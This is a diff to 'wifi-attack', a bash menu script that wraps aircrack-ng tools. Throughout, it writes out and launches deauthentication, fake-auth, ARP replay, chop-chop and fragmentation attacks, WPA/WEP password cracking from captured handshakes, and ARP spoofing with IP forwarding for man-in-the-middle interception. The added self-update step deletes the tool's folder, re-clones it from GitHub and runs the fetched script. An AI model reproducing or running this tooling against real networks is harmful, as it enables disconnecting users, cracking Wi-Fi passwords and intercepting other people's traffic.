@@ -1,12 +1,59 @@
 #!/bin/bash
 
+apt-get install gnome-terminal >> /dev/null
+
 BLUE='\033[1;34m'
 BOLD='\033[1m'
 COLORF='\033[0m'
 GREEN='\033[1;32m'
 RED='\033[1;31m'
 
+function version(){
+VERIFYINTERNET=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' https://google.com)
+if [ "$VERIFYINTERNET" != "000" ]
+then
+VERSION="1.01"
+curl -o /tmp/.version --silent http://127.0.0.1:80
+CHECK=$(cat /tmp/.version)
+rm /tmp/.version
+fi
+}
+
+function doupdate(){
+cd ..
+rm -rf wifi-attack/
+git clone https://github.com/edubuzzi/wifi-attack
+cd wifi-attack
+chmod +x execute.sh
+./execute.sh
+}
+
+function update(){
+if [ "$VERSION" != "$CHECK" ]
+then
+echo
+sleep 0.05
+echo -e "${BOLD}Do you want update wifi-attack to v"$CHECK"?${COLORF}"
+sleep 0.05
+echo
+sleep 0.05
+echo -e "${BOLD}${GREEN}(1) YES${COLORF}"
+sleep 0.05
+echo -e "${BOLD}${RED}(2) NO${COLORF}"
+sleep 0.05
+echo
+sleep 0.05
+read -p "CHOICE => " CHOICE
+case $CHOICE in
+1) doupdate;;
+2) principal;;
+*) update;;
+esac
+fi
+}
+
 function credits(){
+version
 echo
 sleep 0.05
 echo -e "${BOLD}#     #         #######${COLORF}"
@@ -21,7 +68,12 @@ echo -e "${BOLD}#  #  #     #   #           #${COLORF}"
 sleep 0.05
 echo -e "${BOLD}#  #  #     #   #           #${COLORF}"
 sleep 0.05
-echo -e "${BOLD} ## ##      #   #           #${COLORF}"
+if [ "$VERSION" = "$CHECK" ]
+then
+echo -e "${BOLD} ## ##      #   #           #     v1.01${COLORF}"
+else
+echo -e "${BOLD} ## ##      #   #           #     v1.01 ${BLUE}(New Update: v"$CHECK")${COLORF}"
+fi
 sleep 0.05
 echo
 sleep 0.05
@@ -45,21 +97,48 @@ echo -e "${BOLD}===============================================${COLORF}"
 sleep 0.05
 echo -e "${BOLD}Script developed by:${COLORF} ${BLUE}Eduardo Buzzi${COLORF}"
 sleep 0.05
-echo -e "${BOLD}More scripts in:${COLORF} ${RED}https://github.com/edubuzzi${COLORF}"
+echo -e "${BOLD}More scripts in:${COLORF} ${BLUE}https://github.com/edubuzzi${COLORF}"
 sleep 0.05
 echo -e "${BOLD}===============================================${COLORF}"
 sleep 0.05
+update
+}
+
+function interfaces(){
+echo
+INTERFACES=$(ip addr show | grep -v "lo" | grep -v "/" | grep -v "valid" | cut -d '<' -f1 | cut -d ':' -f2 | tr -d " ")
+if [ "$INTERFACES" != "" ]
+then
+echo -e "${BOLD}Your active Network interface(s)${COLORF}"
+sleep 0.05
+echo -e "${BOLD}${GREEN}$INTERFACES${COLORF}"
+sleep 0.05
+echo
+else
+echo -e "${BOLD}${RED}No network adapter found${COLORF}"
+sleep 0.05
+echo
+exit
+fi
 }
 
 function principal(){
-echo
+interfaces
+sleep 0.05
 echo -e "${BOLD}(1) AIRMON-NG${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(2) AIRODUMP-NG${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(3) AIREPLAY-NG${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(4) AIRCRACK-NG${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(5) ARP SPOOFING${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(9) EXIT${COLORF}"
+sleep 0.05
 echo
+sleep 0.05
 read -p "CHOICE => " CHOICE
 case $CHOICE in
 1) airmon;;
@@ -73,12 +152,18 @@ esac
 }
 
 function airmon(){
-echo
-echo -e "${BOLD}${GREEN}(1) AIRMON-NG START${COLORF}"
-echo -e "${BOLD}${RED}(2) AIRMON-NG STOP${COLORF}"
+interfaces
+sleep 0.05
+echo -e "${BOLD}(1) AIRMON-NG START${COLORF}"
+sleep 0.05
+echo -e "${BOLD}(2) AIRMON-NG STOP${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(9) BACK${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(99) EXIT${COLORF}"
+sleep 0.05
 echo
+sleep 0.05
 read -p "CHOICE => " CHOICE
 case $CHOICE in
 1) airmonstart;;
@@ -93,6 +178,11 @@ function airmonstart(){
 touch /tmp/.airmon >> /dev/null
 chmod +x /tmp/.airmon >> /dev/null
 echo 'read -p "Managed mode interface to transform into Monitor mode (ex: wlan0) => " INTERFACE' >> /tmp/.airmon
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.airmon
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.airmon
+echo 'then' >> /tmp/.airmon
+echo 'exit' >> /tmp/.airmon
+echo "fi" >> /tmp/.airmon
 echo 'read -p "Channel to use Monitor mode => (ex: 12) => " CHANNEL' >> /tmp/.airmon
 echo 'airmon-ng start $INTERFACE $CHANNEL >> /dev/null' >> /tmp/.airmon
 echo "echo "If you selected a valid interface, '$INTERFACE' is now '${INTERFACE}'mon"" >> /tmp/.airmon
@@ -107,6 +197,11 @@ function airmonstop(){
 touch /tmp/.airmon >> /dev/null
 chmod +x /tmp/.airmon >> /dev/null
 echo 'read -p "Monitor mode interface to transform into Managed mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.airmon
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.airmon
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.airmon
+echo 'then' >> /tmp/.airmon
+echo 'exit' >> /tmp/.airmon
+echo "fi" >> /tmp/.airmon
 echo 'airmon-ng stop $INTERFACE >> /dev/null' >> /tmp/.airmon
 echo 'service NetworkManager start' >> /tmp/.airmon
 echo "echo "If you selected a valid interface, '${INTERFACE}'mon"" is now '$INTERFACE' >> /tmp/.airmon
@@ -121,6 +216,11 @@ function airodump(){
 touch /tmp/.airodump >> /dev/null
 chmod +x /tmp/.airodump >> /dev/null
 echo 'read -p "Interface in Monitor mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.airodump
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.airodump
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.airodump
+echo 'then' >> /tmp/.airodump
+echo 'exit' >> /tmp/.airodump
+echo "fi" >> /tmp/.airodump
 echo 'read -p "Write the captured traffic to a .CAP file? (ex: /root/handshake/capture-wifi2020) [ENTER to dont use] => " WRITE' >> /tmp/.airodump
 echo "if [ -z "\"'$WRITE'"\" ]" >> /tmp/.airodump
 echo 'then' >> /tmp/.airodump
@@ -184,17 +284,28 @@ principal
 }
 
 function aireplay(){
-echo
+interfaces
+sleep 0.05
 echo -e "${BOLD}(0) DEAUTH${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(1) FAKE AUTH${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(2) INTERATIVE MODE${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(3) ARP REPLAY${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(4) CHOP CHOP${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(5) FRAGMENTATION${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(6) INJECTION TEST${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(9) BACK${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(99) EXIT${COLORF}"
+sleep 0.05
 echo
+sleep 0.05
 read -p "CHOICE => " CHOICE
 case $CHOICE in
 0) deauth;;
@@ -214,6 +325,11 @@ function deauth (){
 touch /tmp/.deuth >> /dev/null
 chmod +x /tmp/.deuth >> /dev/null
 echo 'read -p "Interface in Monitor Mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.deuth
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.deuth
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.deuth
+echo 'then' >> /tmp/.deuth
+echo 'exit' >> /tmp/.deuth
+echo "fi" >> /tmp/.deuth
 echo 'read -p "Number of packets you want to send in the attack (ex: 2) {0 = Infinite Packets} [ ENTER to send 1 Packet ] => " PACKETS' >> /tmp/.deuth
 echo "if [ -z "\"'$PACKETS'"\" ]" >> /tmp/.deuth
 echo 'then' >> /tmp/.deuth
@@ -239,6 +355,11 @@ function fakeauth(){
 touch /tmp/.fakeauth >> /dev/null
 chmod +x /tmp/.fakeauth >> /dev/null
 echo 'read -p "Interface in Monitor Mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
+echo 'then' >> /tmp/.fakeauth
+echo 'exit' >> /tmp/.fakeauth
+echo "fi" >> /tmp/.fakeauth
 echo 'read -p "Number of association requests (ex: 3 to send 3 requests) [ ENTER to send 1 request ] => " ASSOCIATIONREQS' >> /tmp/.fakeauth
 echo "if [ -z "\"'$ASSOCIATIONREQS'"\" ]" >> /tmp/.fakeauth
 echo 'then' >> /tmp/.fakeauth
@@ -285,7 +406,17 @@ chmod +x /tmp/.interativemode >> /dev/null
 touch /tmp/.fakeauth >> /dev/null
 chmod +x /tmp/.fakeauth >> /dev/null
 echo 'read -p "Interface in Monitor mode [to Interative mode] (ex: wlan0mon) => " INTERFACE' >> /tmp/.interativemode
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.interativemode
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.interativemode
+echo 'then' >> /tmp/.interativemode
+echo 'exit' >> /tmp/.interativemode
+echo "fi" >> /tmp/.interativemode
 echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
+echo 'then' >> /tmp/.fakeauth
+echo 'exit' >> /tmp/.fakeauth
+echo "fi" >> /tmp/.fakeauth
 echo 'read -p "AP MAC address (Router) [to Interative mode] => " APMAC' >> /tmp/.interativemode
 echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
 echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
@@ -305,7 +436,17 @@ chmod +x /tmp/.arpreplay >> /dev/null
 touch /tmp/.fakeauth >> /dev/null
 chmod +x /tmp/.fakeauth >> /dev/null
 echo 'read -p "Interface in Monitor mode [to ARP Replay] (ex: wlan0mon) => " INTERFACE' >> /tmp/.arpreplay
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.arpreplay
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.arpreplay
+echo 'then' >> /tmp/.arpreplay
+echo 'exit' >> /tmp/.arpreplay
+echo "fi" >> /tmp/.arpreplay
 echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
+echo 'then' >> /tmp/.fakeauth
+echo 'exit' >> /tmp/.fakeauth
+echo "fi" >> /tmp/.fakeauth
 echo 'read -p "AP MAC address (Router) [to ARP Replay] => " APMAC' >> /tmp/.arpreplay
 echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
 echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
@@ -325,7 +466,17 @@ chmod +x /tmp/.chopchop >> /dev/null
 touch /tmp/.fakeauth >> /dev/null
 chmod +x /tmp/.fakeauth >> /dev/null
 echo 'read -p "Interface in Monitor mode [to Chop Chop] (ex: wlan0mon) => " INTERFACE' >> /tmp/.chopchop
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.chopchop
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.chopchop
+echo 'then' >> /tmp/.chopchop
+echo 'exit' >> /tmp/.chopchop
+echo "fi" >> /tmp/.chopchop
 echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
+echo 'then' >> /tmp/.fakeauth
+echo 'exit' >> /tmp/.fakeauth
+echo "fi" >> /tmp/.fakeauth
 echo 'read -p "AP MAC address (Router) [to Chop Chop] => " APMAC' >> /tmp/.chopchop
 echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
 echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
@@ -345,7 +496,17 @@ chmod +x /tmp/.fragmentation >> /dev/null
 touch /tmp/.fakeauth >> /dev/null
 chmod +x /tmp/.fakeauth >> /dev/null
 echo 'read -p "Interface in Monitor mode [to Fragmentation] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fragmentation
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fragmentation
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fragmentation
+echo 'then' >> /tmp/.fragmentation
+echo 'exit' >> /tmp/.fragmentation
+echo "fi" >> /tmp/.fragmentation
 echo 'read -p "Interface in Monitor mode [to Fake Auth] (ex: wlan0mon) => " INTERFACE' >> /tmp/.fakeauth
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.fakeauth
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.fakeauth
+echo 'then' >> /tmp/.fakeauth
+echo 'exit' >> /tmp/.fakeauth
+echo "fi" >> /tmp/.fakeauth
 echo 'read -p "AP MAC address (Router) [to Fragmentation] => " APMAC' >> /tmp/.fragmentation
 echo 'read -p "AP MAC address (Router) [to Fake Auth] => " APMAC' >> /tmp/.fakeauth
 echo "aireplay-ng -1 0 -a "'$APMAC'" "'$INTERFACE'"" >> /tmp/.fakeauth
@@ -363,6 +524,11 @@ function injectiontest(){
 touch /tmp/.injectiontest >> /dev/null
 chmod +x /tmp/.injectiontest >> /dev/null
 echo 'read -p "Interface in Monitor Mode (ex: wlan0mon) => " INTERFACE' >> /tmp/.injectiontest
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.injectiontest
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.injectiontest
+echo 'then' >> /tmp/.injectiontest
+echo 'exit' >> /tmp/.injectiontest
+echo "fi" >> /tmp/.injectiontest
 echo 'read -p "AP MAC address (Router) [ENTER to dont use] => " APMAC' >> /tmp/.injectiontest
 echo "if [ -z "\"'$APMAC'"\" ]" >> /tmp/.injectiontest
 echo 'then' >> /tmp/.injectiontest
@@ -385,12 +551,18 @@ aireplay
 }
 
 function menuaircrack(){
-echo
+interfaces
+sleep 0.05
 echo -e "${BOLD}(1) CRACK PASSWORD WITH WORDLIST${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(2) SEARCH HANDSHAKE AND PMKID IN .cap FILE${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(9) BACK${COLORF}"
+sleep 0.05
 echo -e "${BOLD}(99) EXIT${COLORF}"
+sleep 0.05
 echo
+sleep 0.05
 read -p "CHOICE => " CHOICE
 case $CHOICE in
 1) aircrack;;
@@ -405,7 +577,15 @@ function aircrack(){
 touch /tmp/.aircrack >> /dev/null
 chmod +x /tmp/.aircrack >> /dev/null
 echo 'read -p "Path and file name for the file you want to crack the password (ex: /root/handshake.cap) => " FILE' >> /tmp/.aircrack
+echo "if [ ! -f "\"'$FILE'"\" ]" >> /tmp/.aircrack
+echo "then" >> /tmp/.aircrack
+echo "exit" >> /tmp/.aircrack
+echo "fi" >> /tmp/.aircrack
 echo 'read -p "Path and name of the wordlist you want to use to crack the password (ex: /root/wordlist.txt) => " WORDLIST' >> /tmp/.aircrack
+echo "if [ ! -f "\"'$WORDLIST'"\" ]" >> /tmp/.aircrack
+echo "then" >> /tmp/.aircrack
+echo "exit" >> /tmp/.aircrack
+echo "fi" >> /tmp/.aircrack
 echo "WORDLIST="\"-w '$WORDLIST'"\"" >> /tmp/.aircrack
 echo 'read -p "Filter by a cryptographic cipher? (1 = WEP, 2 = WPA/WPA2 PSK) [ENTER to dont use] => " ENC' >> /tmp/.aircrack
 echo "case "'$ENC'" in" >> /tmp/.aircrack
@@ -449,6 +629,10 @@ function search(){
 touch /tmp/.search >> /dev/null
 chmod +x /tmp/.search >> /dev/null
 echo 'read -p "Path and file name for the .cap file (ex: /root/capture.cap) => " FILE' >> /tmp/.search
+echo "if [ ! -f "\"'$FILE'"\" ]" >> /tmp/.search
+echo "then" >> /tmp/.search
+echo "exit" >> /tmp/.search
+echo "fi" >> /tmp/.search
 echo 'echo' >> /tmp/.search
 echo "aircrack-ng "'$FILE'" | egrep "\"1 handshake'|'PMKID"\"" >> /tmp/.search
 gnome-terminal --tab -- "/tmp/.search" >> /dev/null
@@ -464,6 +648,11 @@ chmod +x /tmp/.arpspoof >> /dev/null
 chmod +x /tmp/.arpspoof1 >> /dev/null
 chmod +x /tmp/.arpspoof2 >> /dev/null
 echo 'read -p "Interface to perform the ARP Spoof (ex: wlan0) => " INTERFACE' >> /tmp/.arpspoof
+echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.arpspoof
+echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.arpspoof
+echo 'then' >> /tmp/.arpspoof
+echo 'exit' >> /tmp/.arpspoof
+echo "fi" >> /tmp/.arpspoof
 echo 'read -p "Target device IP (ex: 192.168.1.5) => " TARGET' >> /tmp/.arpspoof
 echo 'read -p "Target router IP (ex: 192.168.1.1) => " ROUTER' >> /tmp/.arpspoof
 echo 'echo "1" > /proc/sys/net/ipv4/ip_forward' >> /tmp/.arpspoof
@@ -478,5 +667,6 @@ gnome-terminal --tab -- "/tmp/.arpspoof" >> /dev/null
 rm /tmp/.arpspoof >> /dev/null
 principal
 }
+version
 credits
 principal
